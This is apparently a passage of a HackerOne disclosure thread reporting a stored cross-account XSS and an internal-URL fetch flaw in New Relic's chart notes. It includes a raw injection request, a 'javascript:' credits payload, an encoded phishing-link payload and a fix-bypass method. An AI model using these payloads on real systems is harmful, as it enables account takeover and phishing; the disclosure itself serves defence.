  "vulnerability_information": "Hey team,\n\nI have discovered vulnerability of chart data JSON generation endpoint (when the chart is displayed inside a note) allowing attacker to inject arbitrary fields into it and leading to stored XSS. The impact is higher than usual here because the payload remains after publishing a note so the XSS is **cross-account**. The payload fires at infected note page after victim clicks a link.\n\n###Proof of Concept\nHere I crafted payload that adds new user with role `Admin` to victim's account. So attacker can publish infected note and every admin/owner clicking the link will invite attacker to his own account with admin privileges.\n{F438182}\n\n###Explanation\nThe vulnerability cause is improper user-input filtration at the chart data JSON generation step. When the user saves some chart to note, the following request is made:\n```http\nPOST /accounts/2260599/notes?agent_id=undefined HTTP/1.1\nHost: rpm.newrelic.com\n\nutf8=%E2%9C%93&authenticity_token=47f2Fr393aG89tWfS4byeeEoXdd09p3y8DtKzlZMXJE%3D&app_name=undefined&note_item%5Bswf%5D=&note_item%5Bbegin_time%5D=2019-03-06T04%3A17%3A33-08%3A00&note_item%5Bend_time%5D=2019-03-06T04%3A27%3A45-08%3A00&note_item%5Btitle%5D=TITLE&note_item%5Bdata_url%5D=%2Fchart_data%2Fmetric_charts%2Fsingle_metric.json%3Faccount_id%3D2260599%26add_to_dashboard%3Dfalse%26agent%3D287785625%26chart_type%3DMSLine%26current_product%3Dapm_product%26format_fn%3Dsmart_round%26hide_legend%3Dfalse%26limit%3D100%26name%3DFunction%2526lt%253Bb%2526gt%253Ba%2526lt%253B%252Fb%2526gt%253B%252F__main__%253AMainHandler.get%26no_click%3Dtrue%26no_links%3Dtrue%26number_suffix%3DUNITS%26render_to%3D45055%26show_events%3Dtrue%26subtitle%3DSUBTITLE%26title%3DTITLE%26tw%255Bdur%255D%3D0.17%26tw%255Bend%255D%3D1551875265%26value%3Dstandard_deviation%26no_click%3D1%26no_links%3D1&note_item%5Bcontext_url%5D=%2Faccounts%2F2260599%2Fcustom_dashboards%2Fpages%2F14736%3Ftw%255Bdur%255D%3D0.17%26tw%255Bend%255D%3D1551875265&note_item%5Bnote_text%5D=&note_action=create&note_id=6075&action_after=save_and_close\n```\nParameter `note_item[data_url]` is URL that contains all information about storing chart: account ID, application ID, etc, as well as chart `title`, `subtitle` and `number_suffix`. As I understand, this URL is parsed at the note saving, and all parameters are stored at DB.\nThen, when a note with stored chart is opened, the Highcharts chart URL at this page is set to something like `https://rpm.newrelic.com/accounts/2260599/notes/6077/items/12992/chart_data`. The endpoint above gets the stored `note_item[data_url]` parameters from DB and generates the chart data JSON, that contains everything is needed to draw the chart.\n\nThe vulnerability itself is that at least `title`, `subtitle` and `number_suffix` parameters are HTML-unescaped before they are injected into resulting JSON. So if some of these parameters contains the `&quot;` the resulting JSON becomes broken, for instance:\n{\"title\": \"<title>\"}\nbecomes\n{\"title\": \"**title_with_quot\"**\"}.\n\nThat's the way an attacker can inject arbitrary fields at this JSON.\n\nI am not pretty familiar with the Highcharts JS API but I investigated a little and discovered the `credits` field that is a link with text and href, that can be appended to chart. So in my PoC I injected into chart data JSON some content like the following:\n```json\n{\n  \"credits\": {\n    \"enabled\": true,\n    \"text\": \"click here\",\n    \"href\": \"javascript:alert()\",\n    \"style\": {\n      \"fill\": \"red\"\n    },\n    \"position\": {\n      \"verticalAlign\": \"top\"\n    }\n  }\n}\n```\nThe actual payload is a little more complicated, but this is the main concept.\nIn this way, after the fields are retrieved from DB and the JSON is crafted, the resulting JSON contains an order for Highcharts to draw the credits with malicious link.\n\n###Steps to reproduce:\n1. Sign into New Relic app with some account (attacker)\n2. Save any chart to notes and intercept the saving request using some intercepting proxy tool (e.g. Burp Suite)\n3.

      "message": "Hey team,\n\nAfter further investigations I have discovered that the vulnerability root cause is slightly more complicated.\nI was wrong a little describing how the process works. Now I understand the steps preformed when the chart is saved to note better:\n1. The `note_item[data_url]` URL parameter is saved to DB **as is**, not its parameters only;\n2. When the note is opened, and chart data is loaded from URL like `accounts/2260599/notes/6077/items/12992/chart_data`, server **makes real GET-query with user's cookies** to the saved URL (this is the step where I found an **extra bug** – attacker can submit any *internal* URL here and its content will be followed to the chart);\n3. Then the server processes retrieved data (this is the step where all issues described above like replacing `&quot;` to `\"` and HTML tags processing are done) and returns the processed data to client.\n\n###So, there 2 vulnerabilities in fact:\n1. The one described at my first submission. Improper processing the `note_item[data_url]` response: `&quot;` unescaping and HTML tags processing, that helps attacker to break resulting JSON and inject malicious payload inside.\n2. Improper `note_item[data_url]` check itself: attacker can submit any internal URL there and its content will be returned to the Highcharts chart. So if you fix the first vulnerability, attacker can submit any other internal URL returning JSON with malicious payload when saving a chart to note and it could be resulted in XSS too.\n\nI was not successful with submitting any *external* URL but there are many JSON endpoints at New Relic app and I am pretty sure that some of them could also be used to exploit this vulnerability. In any case, you should check the `note_item[data_url]` URL better (that it is a chart data JSON URL, not something else), because every internal URL (even returning HTML) is allowed now.\n\n###Extra mitigation #2\n\nIn my opinion the design of vulnerable component is bad at all. Storing the URL as is and requesting it when build a chart data JSON is justified only if different complicated endpoints can provide the chart data. For now, I see only `/chart_data/metric_charts/single_metric.json` endpoint providing initial chart data, so you can parse a submitted URL and get necessary parameters from it, and then get data from DB searching for the corresponding entries. If I am wrong and there are many different endpoints, you should build a URL white list, containing only trusted endpoints, that may not contain malicious JSON.\n\nIf I am not clear somewhere, please feel free to reach me and I will be glad to help in discovering and mitigating the issues.\n\n**P.S.**: I have decided not to submit the second bug apart, but if you agree that there 2 different root causes exist, the extra bounty bonus will be much appreciated :)",

This code can do every thing the attacker want, including inviting other user as account admin (when the victim is admin or owner). \n\nWhy this is more impactful than, for example #348076? It's because at the #348076, the payload is stored inside the account area, so it may only be placed by account member (with at least role `User`). So at that case, the attacker can attack his own admin only. And in **this** case, the user can attack **other** account admin, because the payload is stored inside public area, available for any user of New Relic.\n\nHope this will help you to understand the issue impact ;)",

rpm.newrelic.com\n<redacted>\n\nutf8=%E2%9C%93&authenticity_token=ny%2BgLH4ynkp9bFbwouysKyYMWH0da9e5G4cJ2tna5YM%3D&app_name=undefined&note_item%5Bswf%5D=&note_item%5Bbegin_time%5D=2019-03-13T08%3A03%3A08-07%3A00&note_item%5Bend_time%5D=2019-03-13T08%3A33%3A08-07%3A00&note_item%5Btitle%5D=TITLE&note_item%5Bdata_url%5D=%2Fchart_data%2Fmetric_charts%2Fsingle_metric.json%3Faccount_id%3D2260599%26add_to_dashboard%3Dfalse%26agent%3D287785625%26chart_type%3DMSLine%26current_product%3Dapm_product%26format_fn%3Dsmart_round%26hide_legend%3Dfalse%26limit%3D100%26name%3DFunction%252F__main__%253AMainHandler.get%26no_click%3Dtrue%26no_links%3Dtrue%26number_suffix%3DUNITS%2526%2523x27%253Bxss%26render_to%3D45054%26show_events%3Dtrue%26subtitle%3DSUBTITLE%26title%3DTITLE%26tw%255Bdur%255D%3Dlast_30_minutes%26tw%255Bend%255D%3D1552491188%26value%3Dstandard_deviation%26no_click%3D1%26no_links%3D1&note_item%5Bcontext_url%5D=%2Faccounts%2F2260599%2Fcustom_dashboards%2Fpages%2F14736%3Ftw%255Bdur%255D%3Dlast_30_minutes%26tw%255Bend%255D%3D1552491188&note_item%5Bnote_text%5D=&note_action=create&note_id=6136&action_after=save_and_close\n```\n\n2) Ejects the `note_item%5Bdata_url%5D` parameter value and urldecode it getting the

Since I understand how the XSS can be used to invite an admin to your account, can you provide me with a simpler payload that *only* displays an alert box? \n\nI only need to demonstrate that javascript can indeed be executed. If I can demonstrate that, then it implies that it can be also be used to invite an admin.\n\nHopefully if you can provide me with an alert box payload, I can reproduce and pay you a reward :)",

      "message": "Hey @jmcaleer,\n\nThe issue isn't resolved properly. The core vulnerability cause is that `&quot;` escape sentence is HTML-decoded and breaks the resulting JSON becoming the `\"` inside server response, which gives an attacker the opportunity to inject arbitrary chart attributes. Instead of fixing the core cause, the devs have added the replace rule changing the `javascript:` to `javascript ` (with the space sign at the end). That's why you observed the behavior above: the link `javascript alert()` considers as internal link by browser so it tries to load `https://rpm.newrelic.com/accounts/{account_id}/notes/javascript%20alert()`.\n\nBut attacker still can, for instance, use a regular links to perform a phishing attack against the victim. This is how you can reproduce this case:\n1) Sign into New Relic app with some account (attacker)\n2) Save any chart to notes and intercept the saving request using some intercepting proxy tool (e.g. Burp Suite)\n3) Find parameter `note_item%5Bdata_url%5D`, then find any `%26` inside it and replace it with\n```\n%26%73%75%62%74%69%74%6c%65%3d%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%64%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%33%25%37%32%25%36%35%25%36%34%25%36%39%25%37%34%25%37%33%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%35%25%36%65%25%36%31%25%36%32%25%36%63%25%36%35%25%36%34%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%34%25%37%32%25%37%35%25%36%35%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%38%25%37%32%25%36%35%25%36%36%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%36%37%25%36%66%25%36%66%25%36%37%25%36%63%25%36%35%25%32%65%25%36%33%25%36%66%25%36%64%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%34%25%36%35%25%37%38%25%37%34%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%35%33%25%36%66%25%36%64%25%36%35%25%37%34%25%36%38%25%36%39%25%36%65%25%36%37%25%32%30%25%36%39%25%37%33%25%32%30%25%37%37%25%37%32%25%36%66%25%36%65%25%36%37%25%32%30%25%36%31%25%37%34%25%32%30%25%36%66%25%37%35%25%37%32%25%32%30%25%36%35%25%36%65%25%36%34%25%32%65%25%32%30%25%35%30%25%36%63%25%36%35%25%36%31%25%37%33%25%36%35%25%32%30%25%36%33%25%36%63%25%36%39%25%36%33%25%36%62%25%32%30%25%36%38%25%36%35%25%37%32%25%36%35%25%32%30%25%37%34%25%36%66%25%32%30%25%37%32%25%36%35%25%37%34%25%37%32%25%37%39%25%32%65%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%33%25%37%34%25%37%39%25%36%63%25%36%35%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%33%25%36%66%25%36%63%25%36%66%25%37%32%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%32%25%36%35%25%36%34%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%36%25%36%66%25%36%65%25%37%34%25%35%33%25%36%39%25%37%61%25%36%35%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%32%25%33%30%25%37%30%25%37%38%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%64%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%30%25%36%66%25%37%33%25%36%39%25%37%34%25%36%39%25%36%66%25%36%65%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%31%25%36%63%25%36%39%25%36%37%25%36%65%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%33%25%36%35%25%36%65%25%37%34%25%36%35%25%37%32%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%36%25%36%35%25%37%32%25%37%34%25%36%39%25%36%33%25%36%31%25%36%63%25%34%31%25%36%63%25%36%39%25%36%37%25%36%65%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%34%25%36%66%25%37%30%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%39%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%33%33%25%33%30%25%37%64%25%37%64%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%35%66%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%35%66%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%26\n```\n4) Send edited request.\n5) Open the newest note and make sure it contains a red credits link at the top of chart.\n6) Press the link and make sure you are redirected to `google.com`\n\nAttacker can also use `data:` URIes and any other schemes, because the `javascipt:` is only thing to be replaced. And he maybe still can perform an XSS, because the arbitrary chart parameters still could be injected into the server response (but it can take a long to find another place to inject a payload (w/o using the javascript: link), so I think you agree that an active link is sufficient proof of the fact that the issue are not fixed correctly).\n\nIf I should find a bypass exactly leading to XSS, to issue be reopened, I can report this one as HTML-injection separately, and try to find a full bypass. But please believe, the fix is wrong.",

As with any ticket, we will determine if the vulnerability from the retest is an acceptable risk. Hopefully, in the resolve we will tell you if our tests find any acceptable risk, but some things can fall through the cracks when we're testing so I can't necessarily guarantee we will tell you all the acceptable risks nor guarantee you will find a vulnerability to award a bonus for. \n\nHowever, you normally find valid \"unacceptable\" vulnerabilities, I would assume we would probably award you a bonus for retests (even if it's second or third). When I reproduce your test case, I'll determine if it's an actual issue or not. It sounds like it is, so I'll probably be awarding a second bonus.\n\nI hope that's somewhat resolves your concerns.",

      "message": "@jmcaleer\n\nTechnically, the `data:` URI allows to execute JS, but with no access to user cookies (the browser considers the JS located at `data:` as belonging to different origin). So, actually, this is not really an XSS, it is rather an open redirect, because the only real impact an attacker can exploit is to redirect a victim somewhere.\n\nI think the actual type of this issue is `code injection` rather than others, because attacker can at least inject a malicious styled link.\n\nI mentioned that the XSS is could be possible exploited because\n> the arbitrary chart parameters still could be injected into the server response\n\nThe HighCharts API is quite complicated and allows the user to change the chart behavior in many ways, including the arbitrary HTML-rendering inside different places (e.g. labels, caption etc.). This is what I've used before to perform the XSS w/o user interaction. You can navigate to this [API docs](https://api.highcharts.com/highcharts/) and search for `useHTML` above the classes list for instance.\n\nAfter my little yesterday investigation, I've noticed, that the tags I used before (like `<img src=x onerror=alert()>`, are removed from the response now. Thus, it is not possible now to use my previous payload combining the `useHTML` chart parameter and the tags with malicious event listener inside. But, I've noticed also that there is some (different from the ones before) response JSON places, where the tags are not removed but just encoded. So it needs deep digging to investigate the XSS possibility after the previous (actually incorrect) fix. The simplest way is fixed, but not a root cause. So, having the complicated API and unstable tags filtering, I think that the XSS may be still possible.\n\nI just don't know if it is really necessary to spend a time for building such payload, or you can just explain to the dev team, that the arbitrary HighCharts attributes are still could be injected into chart JSON (using my yesterday poc with a simple link) and ask them to fix a bug properly (do not unescape `&quot;` and thus do not allow attacker to inject arbitrary HighCharts JSON attributes)?\n\nJust to be more clear, the vulnerability root cause is that the server should produce a JSON for a chart with some fixed fields like title, subtitile, series and so on. But, using the `&quot;` unescaping bug, I can add extra fields into this JSON (like the \"credits\", I've used at my yesterday payload), which will be processed by HighChartsJS and so can turn many undesirable HighCharts API features (like HTML rendering instead using just SVG) on.\n\nIf you can just change the issue type to the code injection and the issue will be fixed after that, I think it is a good way.",
